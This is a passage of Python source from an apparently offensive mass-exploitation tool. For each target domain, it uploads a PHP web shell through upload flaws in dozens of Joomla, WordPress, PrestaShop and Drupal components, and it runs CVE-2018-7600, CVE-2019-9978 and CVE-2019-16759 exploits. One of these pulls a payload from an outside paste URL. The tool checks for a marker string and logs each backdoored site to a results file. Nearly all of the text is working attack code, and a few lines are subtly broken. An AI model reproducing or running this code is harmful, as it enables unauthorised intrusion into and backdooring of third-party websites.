        check7drupal = requests.get(f'http://{domain}/sites/default/files/axv.php', headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in check7drupal:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}7-DRUPAL -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/sites/default/files/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}7-DRUPAL -->> {red}Not Vuln !")
    except:pass

def Com_jbcatalog(domain):
    try:
        com_pathjb = "modules/0KemYggJIdGfpf5i42FN/shells/axv.php"
        com_jbcatalogjb = {'files[]':open(com_pathjb, 'rb')}
        requests.post(f'https://{domain}/components/com_jbcatalog/libraries/jsupload/server/php/', files=com_jbcatalogjb, headers=ua, timeout=20, verify=False)
        Shjb = requests.get(f'http://{domain}/com_jbcatalog/libraries/jsupload/server/php/files/axv.php', headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in Shjb:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}JBCATALOG -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/com_jbcatalog/libraries/jsupload/server/php/files/{com_pathjb}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}JBCATALOG -->> {red}Not Vuln !")
    except:pass
    
def Adsmanager_shell(domain):
    try:
        shellcxss = 'modules/0KemYggJIdGfpf5i42FN/shells/index.jpg'
        filescxss = {'file': open(shellcxss, 'rb')}
        datacxss = {"name": "axv.php"}
        urlcxss = f'http://{domain}/index.php?option=com_adsmanager&task=upload&tmpl=component'
        rcxss = requests.post(urlcxss, files=filescxss,headers=ua, data=datacxss, timeout=20, verify=False).text
        if '"jsonrpc"' in rcxss:
            requests.post(f"https://{domain}", files=filescxss, data={"name": "axv.phP"}, headers=ua, timeout=20, verify=False)
            requests.post(f"https://{domain}", files=filescxss, data={"name": "axv.phtml"}, headers=ua, timeout=20, verify=False)
            Checkcxss = requests.get(f'http://{domain}/tmp/plupload/axv.php', headers=ua, timeout=10, verify=False)
            Check2cxss = requests.get(f'http://{domain}/tmp/plupload/axv.phP', headers=ua, timeout=10, verify=False)
            Check3cxss = requests.get(f'http://{domain}/tmp/plupload/axv.phtml', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in Checkcxss.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}COM_ADSMANAGER -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"http://{domain}/tmp/plupload/axv.php\n")
            elif 'AXVTECH' in Check2cxss.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}COM_ADSMANAGER -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"http://{domain}/tmp/plupload/axv.phP\n")
            elif 'AXVTECH' in Check3cxss.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}COM_ADSMANAGER -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"http://{domain}/tmp/plupload/axv.phtml\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}COM_ADSMANAGER -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}COM_ADSMANAGER -->> {red}Not Vuln !")
    except:pass
    
def Com_jdownloads(domain):
    try:
        directcom_jd = 'modules/0KemYggJIdGfpf5i42FN/shells/axv.php3.g'
        arcom_jd = 'modules/0KemYggJIdGfpf5i42FN/shells/axv.zip'
        filescom_jd = {'file_upload': (arcom_jd, open(arcom_jd, 'rb'), 'multipart/form-data'), 'pic_upload': (directcom_jd, open(directcom_jd, 'rb'), 'multipart/form-data')}
        datacom_jd = {
            'name': 'AXVTECH',
            'mail': 'japanesecsxz@gmail.com',
            'catlist': '1',
            'filetitle': "axvtech",
            'description': "<p>axvtech</p>",
            '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
            'send': 1,
            'senden': "Send file",
            'description': "<p>axvtech</p>",
            'option': "com_jdownloads",
            'view': "upload"
            }
        vulncom_jd = f'https://{domain}/index.php?option=com_jdownloads&Itemid=0&view=upload'
        rcom_jd = requests.post(vulncom_jd, files=filescom_jd,headers=ua,data=datacom_jd, timeout=20, verify=False)
        if '/upload_ok.png' in rcom_jd.text:
            urlcom_jd = f'http://{domain}/images/jdownloads/screenshots/axv.php3.g'
            checkcom_jd = requests.get(urlcom_jd,headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in checkcom_jd.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_jdownloads -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"http://{urlcom_jd}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_jdownloads -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_jdownloads -->> {red}Not Vuln !")
    except:pass
    
def Pure(domain):
    try:
        linkpure = f'http://{domain}/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php'
        shellpure = f"http://{domain}/axv.php"
        filenampure = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php')
        filespure = {"Filedata":filenampure}
        requests.post(linkpure,files=filespure, headers=ua, timeout=20, verify=False)
        getpure = requests.get(shellpure, headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in getpure:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}PUREVISION -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellpure}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PUREVISION -->> {red}Not Vuln   !")
    except:pass

    
def Sympo(domain):
    try:
        linksympo = f'https://{domain}/wp-content/plugins/wp-symposium/server/php/index.php'
        filenamesympo = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filessympo = {"files[]":filenamesympo}
        requests.post(linksympo,files=filessympo,headers=ua, timeout=20, verify=False)
        donesympo = f'http://{domain}/wp-content/plugins/wp-symposium/server/php/up.php'
        eesympo = requests.get(donesympo,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eesympo:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}SYMPO -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{donesympo}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}SYMPO -->> {red}Not Vuln !")
    except:pass
    
def RightNow(domain):
    try:
        linkRightNow = f'https://{domain}/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php'
        filenameRightNow = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filesRightNow = {"Filedata":filenameRightNow}
        requests.post(linkRightNow,files=filesRightNow,headers=ua, timeout=20, verify=False)
        doneRightNow = f'http://{domain}/wp-content/uploads/settingsimages/up.php'
        eeRightNow = requests.get(doneRightNow,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eeRightNow:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}RIGHTNOW -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{doneRightNow}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}RIGHTNOW -->> {red}Not Vuln !")
    except:pass
    
def JexEx1(domain):
    try:
        linkJexEx1 = f'https://{domain}/modules/cartabandonmentproOld/upload.php'
        filenameJexEx1 = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.jpg','rb')
        filesJexEx1 = {"image":filenameJexEx1}
        requests.post(linkJexEx1,files=filesJexEx1,headers=ua, timeout=30, verify=False)
        doneJexEx1 = f'http://{domain}/modules/cartabandonmentproOld/uploads/axv.jpg'
        eeJexEx1 = requests.get(doneJexEx1,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eeJexEx1:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}CartabandonmentproOld -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{doneJexEx1}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CartabandonmentproOld -->> {red}Not Vuln !")
    except:pass

def JexEx2(domain):
    try:
        linkJexEx2 = f'https://{domain}/administrator/components/com_alberghi/upload.alberghi.php'
        filenameJexEx2 = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filesJexEx2 = {"userfile":filenameJexEx2}
        requests.post(linkJexEx2,files=filesJexEx2,headers=ua, timeout=20, verify=False)
        doneJexEx2 = f'http://{domain}/administrator/components/com_alberghi/axv.php'
        eeJexEx2 = requests.get(doneJexEx2,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eeJexEx2:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_alberghi -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{doneJexEx2}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_alberghi -->> {red}Not Vuln !")
    except:pass
    
def CombtPor(domain):
    try:
        PostFilebt = {'Filedata': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(f"https://{domain}/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php",files=PostFilebt,headers=ua, timeout=30, verify=False)
        cekShellbt = requests.get(f"http://{domain}/administrator/components/com_bt_portfolio/axv.php",headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in str(cekShellbt):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_bt_portfolio -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/administrator/components/com_bt_portfolio/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_bt_portfolio -->> {red}Not Vuln !")
    except:pass
    

def JexEx5(domain):
    try:
        IndeXpathJexEx5 = ''
        JexEx5Files = {'file': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        ExpJexEx5 = requests.post('https://' + domain + '/index.php?option=com_myblog&task=ajaxupload', files=JexEx5Files, headers=ua, timeout=30, verify=False)
        if 'success' in str(ExpJexEx5.text) or 'File exists' in str(ExpJexEx5.text):
            if '/images/axv' in str(ExpJexEx5):
                IndeXpathJexEx5 = 'http://' + domain + '/images/axv.php'
            else:
                try:
                    GetPAthJexEx5 = re.findall("source: '(.*)'", str(ExpJexEx5.text))
                    IndeXpathJexEx5 = GetPAthJexEx5[0]
                except:
                    IndeXpathJexEx5 = 'http://' + domain + '/images/axv.php'
            ExpJexEx5Req = requests.get('http://' + domain + '/jwallpapers_files/plupload/axv.php', headers=ua, timeout=10, verify=False).text
            if 'AXVTECH' in str(ExpJexEx5Req):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_MyBlog -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"{IndeXpathJexEx5}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_MyBlog -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_MyBlog -->> {red}Not Vuln !")
    except:pass
    
def JexEx4(domain):
    try:
        JexEx4Files = {'file': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post('https://' + domain + '/index.php?option=com_jwallpapers&task=upload', files=JexEx4Files, headers=ua, timeout=30, verify=False)
        ExpJexEx4 = requests.get('http://' + domain + '/jwallpapers_files/plupload/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(ExpJexEx4.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_jwallpapers -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/jwallpapers_files/plupload/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_jwallpapers -->> {red}Not Vuln !")
    except:pass
    
def JexEx6(domain):
    try:
        PostDataJexEx6 = {'path': '../../../tmp/'}
        filJexEx6 = {'raw_data': ('axv.php', shell, 'text/html')}
        requests.post('https://' + domain + '/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php', files=filJexEx6, data=PostDataJexEx6, headers=ua, timeout=30, verify=False)
        CheckShellJexEx6 = requests.get('http://' + domain + '/tmp/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(CheckShellJexEx6.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_oziogallery -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/tmp/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_oziogallery -->> {red}Not Vuln !")
    except:pass
    
def JexEx7(domain):
    try:
        requests.post('https://' + domain + '/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=axv.php', data=shell, headers=ua, timeout=30, verify=False)
        ExpJexEx7 = requests.get('http://' + domain + '/administrator/components/com_redmystic/chart/tmp-upload-images/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(ExpJexEx7.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_redmystic -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/administrator/components/com_redmystic/chart/tmp-upload-images/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_redmystic -->> {red}Not Vuln !")
    except:pass
    
def JexEx8(domain):
    try:
        PostDataJexEx8 = {'jpath': '../../../../'}
        filJexEx8 = {'files[]': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post('https://' + domain + '/administrator/components/com_rokdownloads/assets/uploadhandler.php', files=filJexEx8, data=PostDataJexEx8, headers=ua, timeout=30, verify=False)
        CheckShellJexEx8 = requests.get('http://' + domain + '/images/stories/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(CheckShellJexEx8.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_rokdownloads -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/images/stories/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_rokdownloads -->> {red}Not Vuln !")
    except:pass
    
def JexEx3(domain):
    try:
        requests.post('https://' + domain + '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=axv.php', data=shell, headers=ua, timeout=20, verify=False)
        ExpJexEx3 = requests.get('http://' + domain + '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(ExpJexEx3.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_civicrm -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_civicrm -->> {red}Not Vuln !")
    except:pass
    
def Dain(domain):
    try:
        PostDataJexEx9 = {'jpath': '..%2F..%2F..%2F..%2Ftmp%2F'}
        filJexEx9 = {'file': ('axv.php.xxxjpg', shell, 'text/html')}
        requests.post('https://' + domain + '/administrator/components/com_simplephotogallery/lib/uploadFile.php', files=filJexEx9, data=PostDataJexEx9, headers=ua, timeout=30, verify=False)
        CheckShellJexEx9 = requests.get('http://' + domain + '/tmp/axv.php.xxxjpg', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(CheckShellJexEx9.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_simplephotogallery -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/tmp/axv.php.xxxjpg\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_simplephotogallery -->> {red}Not Vuln !")
    except:pass

    try:
        PostDataJexEx10 = {'dm_upload': ''}
        filJexEx10 = {'upfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post('https://' + domain, files=filJexEx10, data=PostDataJexEx10, headers=ua, timeout=30, verify=False)
        CheckShellJexEx10 = requests.get('http://' + domain + '/wp-content/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(CheckShellJexEx10.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Downloads-Manager -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/wp-content/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Downloads-Manager -->> {red}Not Vuln !")
    except:pass

    try:
        PostDataJexEx11 = {'action': 'themeupload','submitter': 'Upload','overwriteexistingtheme': 'on','page': 'GZNeFLoZAb'}
        filJexEx11 = {'my-theme': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.zip', 'rb')}
        JexEx11Req = requests.post('https://' + domain + '/wp-admin/admin-post.php?page=wysija_campaigns&action=themes', files=filJexEx11, data=PostDataJexEx11, headers=ua, timeout=30, verify=False)
        if 'page=wysija_campaigns&amp;action=themes&amp;reload=1' in str(JexEx11Req.text):
            CheckShellJexEx11 = requests.get('http://' + domain + '/wp-content/uploads/wysija/themes/axv/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(CheckShellJexEx11.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}wysija-newsletters -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"http://{domain}/wp-content/uploads/wysija/themes/axv/axv.php\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}wysija-newsletters -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Downloads-Manager -->> {red}Not Vuln !")
    except:pass

    try:
        PrivatePAyLoadJexEx12 = "echo 'AXVTECH' > vuln.htm; echo '" + shell + "'> sites/default/files/vuln.php; echo '" + shell + "'> vuln.php; cd sites/default/files/; echo 'AddType application/x-httpd-php .jpg' > .htaccess; echo '" + shell + "'> up.php;"
        get_paramsJexEx12 = {'q': 'user/password','name[#post_render][]': 'passthru','name[#markup]': PrivatePAyLoadJexEx12,'name[#type]': 'markup'}
        post_paramsJexEx12 = {'form_id': 'user_pass','_triggering_element_name': 'name'}
        rJexEx12 = requests.post('https://' + domain, data=post_paramsJexEx12, params=get_paramsJexEx12, headers=ua, timeout=30,verify=False)
        mJexEx12 = re.search('<input type="hidden" name="form_build_id" value="([^"]+)" />', rJexEx12.text)
        if mJexEx12:
            foundJexEx12 = mJexEx12.group(1)
            get_paramsJexEx12 = {'q': 'file/ajax/name/#value/' + foundJexEx12}
            post_paramsJexEx12 = {'form_build_id': foundJexEx12}
            requests.post('https://' + domain, data=post_paramsJexEx12,params=get_paramsJexEx12, headers=ua, timeout=30,verify=False)
            aJexEx12 = requests.get('http://' + domain + '/sites/default/files/vuln.php', timeout=10, headers=ua,verify=False)
            if 'AXVTECH' in str(aJexEx12.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2018-7600 -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"http://{domain}/sites/default/files/vuln.php\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2018-7600 -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2018-7600 -->> {red}Not Vuln !")
    except:pass

    try:
        Payload99788 = "https://paste.myconan.net/483780.txt"
        exp99788 = f'https://{domain}/wp-admin/admin-post.php?swp_debug=load_options&swp_url={Payload99788}'
        requests.get(exp99788, timeout=10, headers=ua, verify=False)
        CheckShell99788 = requests.get(f'http://{domain}/wp-admin/axv.php', timeout=15, headers=ua, verify=False)
        if 'AXVTECH' in str(CheckShell99788.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2019-9978 -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/wp-admin/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2019-9978 -->> {red}Not Vuln !")
    except:pass

    try:
        ShellPayload = f"echo shell_exec('echo {shell} > axv.php'); exit;"
        params2 = {'routestring': 'ajax/render/widget_php'}
        params2['widgetConfig[code]'] = f'{ShellPayload}'
        requests.post('https://' + domain, data=params2, timeout=30, headers=ua, verify=False)
        CheckShell16759 = requests.get(f"http://{domain}/axv.php", timeout=10, headers=ua, verify=False)
        if 'AXVTECH' in str(CheckShell16759.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2019-16759 -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2019-16759 -->> {red}Not Vuln !")
    except:pass

    try:
        PostFileMgaM = {'Filedata': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post('https://' + domain + '/modules/megamenu/uploadify/uploadify.php?folder=modules/megamenu/uploadify/', files=PostFileMgaM, timeout=30, headers=ua, verify=False)
        CheckSheMgaM = requests.get(f"http://{domain}/modules/megamenu/uploadify/axv.php", timeout=10, headers=ua, verify=False)
        if 'AXVTECH' in str(CheckSheMgaM.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Megamenu Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/modules/megamenu/uploadify/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Megamenu Module -->> {red}Not Vuln !")
    except:pass

    try:
        FileShellRFU = {'file': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        PostDataRFU = {'settings_upload': 'settings','page': 'pagelines'}
        urlRFU = 'https://' + domain + '/wp-admin/admin-post.php'
        requests.post(urlRFU, files=FileShellRFU, data=PostDataRFU, headers=ua, timeout=30, verify=False)
        CheckShelRFU = requests.get(f"http://{domain}/wp-content/axv.php", timeout=10, headers=ua, verify=False)
        if 'AXVTECH' in str(CheckShelRFU.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Pagelines RFU -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/wp-content/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Pagelines RFU -->> {red}Not Vuln !")
    except:pass

    try:
        ShellPrestawizard = 'modules/0KemYggJIdGfpf5i42FN/shells/axv.php'
        Expwizard = 'https://' + domain + '/modules/1attributewizardpro/file_upload.php'
        FileDataShellwizard = {'userfile': open(ShellPrestawizard, 'rb')}
        Got2wizard = requests.post(Expwizard, files=FileDataShellwizard, timeout=30, headers=ua, verify=False)
        if 'axv.php' in str(Got2wizard.text):
            Shellwizardpro = str(Got2wizard.text).split('|||')[0]
            ShellPathwizardpro = 'http//' + domain + '/modules/1attributewizardpro/file_uploads/' + Shellwizardpro
            CheckShellwizard = requests.get('http://' + ShellPathwizardpro, timeout=10, headers=ua)
            if 'AXVTECH' in str(CheckShellwizard.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}1attributewizardpro Module -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"{ShellPathwizardpro}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}1attributewizardpro Module -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}1attributewizardpro Module -->> {red}Not Vuln !")
    except:pass

    # advancedslider Module
    try:
        Expadvancedslider = f'https://{domain}/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php'
        FileDataadvancedslider = {'qqfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php' 'rb')}
        requests.post(Expadvancedslider, files=FileDataadvancedslider, headers=ua, timeout=30, verify=False)
        CheckSheladvancedslider = requests.get(f"http://{domain}/modules/advancedslider/uploads/axv.php", timeout=10, headers=ua, verify=False)
        if 'AXVTECH' in str(CheckSheladvancedslider.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}advancedslider Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/modules/advancedslider/uploads/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}advancedslider Module -->> {red}Not Vuln !")
    except:pass

    # attributewizardpro_x Module
    try:
        Exppro_x = f'https://{domain}/modules/attributewizardpro_x/file_upload.php'
        FileDatapro_x = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php' 'rb')}
        Gottpro_x = requests.post(Exppro_x, files=FileDatapro_x, headers=ua, timeout=30, verify=False)
        if 'axv.php' in str(Gottpro_x.text):
            Shellpro_x = Gottpro_x.text.split('|||')[0]
            ShellPathpro_x = f'http://{domain}/modules/file_uploads/{Shellpro_x}'
            CheckShelpro_x = requests.get(f"{ShellPathpro_x}", timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in str(CheckShelpro_x.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}attributewizardpro_x Module -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"{ShellPathpro_x}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}attributewizardpro_x Module -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}1attributewizardpro Module -->> {red}Not Vuln !")
    except:pass

    try:
        Expattribu = f'https://{domain}/modules/attributewizardpro/file_upload.php'
        FileDataattribu = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php' 'rb')}
        Gottattribu = requests.post(Expattribu, files=FileDataattribu, headers=ua, timeout=30, verify=False)
        if 'axv.php' in str(Gottattribu.text):
            Shellattribu = Gottattribu.text.split('|||')[0]
            ShellPathattribu = f'http://{domain}/modules/attributewizardpro/file_uploads/{Shellattribu}'
            CheckShelattribu = requests.get(f"{ShellPathattribu}", timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in str(CheckShelattribu.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}attributewizardpro Module -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"{ShellPathattribu}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}attributewizardpro Module -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}1attributewizardpro Module -->> {red}Not Vuln !")
    except:pass

    try:
        Exppro3 = f'https://{domain}/modules/attributewizardpro.OLD/file_upload.php'
        FileDatapro3 = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php' 'rb')}
        Gottpro3 = requests.post(Exppro3, files=FileDatapro3, headers=ua, timeout=30, verify=False)
        if 'axv.php' in str(Gottpro3.text):
            Shellpro3 = Gottpro3.text.split('|||')[0]
            ShellPathpro3 = f'http://{domain}/modules/attributewizardpro.OLD/file_uploads/{Shellpro3}'
            CheckShelpro3 = requests.get(f"{ShellPathpro3}", timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in str(CheckShelpro3.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}attributewizardpro3 Module -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"{ShellPathpro3}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}attributewizardpro3 Module -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}attributewizardpro3 Module -->> {red}Not Vuln !")
    except:pass

    try:
        linkmentpro = f'https://{domain}/modules/cartabandonmentpro/upload.php'
        filenamementpro = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.jpg','rb')
        filesmentpro = {"image":filenamementpro}
        requests.post(linkmentpro,files=filesmentpro,headers=ua, timeout=30, verify=False)
        donementpro = f'http://{domain}/modules/cartabandonmentpro/uploads/axv.jpg'
        eementpro = requests.get(donementpro,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eementpro:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Cartabandonmentpro -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donementpro}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Cartabandonmentpro -->> {red}Not Vuln !")
    except:pass

    try:
        linkverts = f'https://{domain}/modules/columnadverts/uploadimage.php'
        filenameverts = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')}
        requests.post(linkverts,files=filenameverts,headers=ua, timeout=30, verify=False)
        doneverts = f'http://{domain}/modules/columnadverts/slides/axv.php'
        eeverts = requests.get(doneverts,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eeverts:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Columnadverts Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{doneverts}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Columnadverts Module -->> {red}Not Vuln !")
    except:pass
    
    try:
        linkhomepage = f'https://{domain}/modules/homepageadvertise/uploadimage.php'
        filenamehomepage = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linkhomepage,files=filenamehomepage,headers=ua, timeout=30, verify=False)
        donehomepage = f'http://{domain}/modules/homepageadvertise/slides/axv.php'
        eehomepage = requests.get(donehomepage,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eehomepage:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}homepageadvertise Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donehomepage}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}homepageadvertise Module -->> {red}Not Vuln !")
    except:pass

    try:
        linkhomepage2 = f'https://{domain}/modules/homepageadvertise2/uploadimage.php'
        filenamehomepage2 = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linkhomepage2,files=filenamehomepage2,headers=ua, timeout=30, verify=False)
